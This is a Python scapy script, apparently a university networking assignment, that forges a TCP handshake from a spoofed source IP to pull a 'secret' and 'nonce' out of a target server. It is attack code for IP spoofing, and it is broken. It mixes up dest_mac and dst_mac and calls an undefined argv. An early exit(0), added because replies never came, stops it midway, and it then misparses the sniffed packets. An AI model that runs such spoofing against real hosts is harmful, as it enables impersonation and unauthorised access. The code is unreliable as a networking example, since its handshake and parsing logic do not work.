import socket
import json
import sys
from scapy.all import *

with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as s:
    # Form the contents of what we will send.
    identifier = 'west.all@northeastern.edu'.encode('utf-8')
    contents = len(identifier).to_bytes(2, 'big') + identifier
    
    # Packet variables.
    spoofed_ip = '10.0.0.1'
    if (len(sys.argv) > 1):
        dst_ip = sys.argv[1][:sys.argv[1].index(':')]
        dst_p = int(sys.argv[1][sys.argv[1].index(':') + 1:])
    else:
        dst_ip = '127.0.0.1'
        dst_p = 10010
    src_p = 10011
    src_mac = '00:00:00:00:00:00'
    if (len(sys.argv) > 2):
        dest_mac = sys.argv[2]
    else:
        dst_mac = '00:00:00:00:00:00'
    if (len(sys.argv) > 3):
        interface = argv[3]
    else:
        interface = 'eth0'

    # For TCP inside IP inside ETH.
    eth = Ether(src=src_mac, dst=dst_mac, type=0x800)
    ip =  IP(src=spoofed_ip, dst=dst_ip, flags="DF", ttl=5, len=52)
    SYN = TCP(flags="S", sport=src_p, dport=dst_p, seq=100, options=[("MSS", 65495), ('SAckOK',b''), ("WScale", 7)])
    
    # Send and listen for response (synack)
    SYNACK = srp1(eth/ip/SYN, timeout=2, iface=interface)

    # This is here because I have not been receiving SYNACKs and the program errors without this.
    exit(0)

    # New TCP packet with incremented seq and ack as the ack.
    ACK = TCP(flags="A", sport=src_p, dport=dst_p, seq=101, ack=SYNACK.seq + 1)
    send(eth/ip/ACK/contents)

    # Sniff the response.
    traffic = sniff(filter="tcp and host 127.0.0.1", count=1, iface=interface, timeout=2)

    # Parse the response.
    response = traffic.payload.layers()[3]
    authorized = response[0]
    secret_length = int.from_bytes(response[1:3], 'big')
    secret = response[3:3+secret_length]
    nonce_length = int.from_bytes(response[3+secret_length:5+secret_length], 'big')
    nonce = response[5+secret_length:]
    
    # Format json output.
    output = {"id":identifier, "secret":secret, "nonce":nonce}
    print(output)
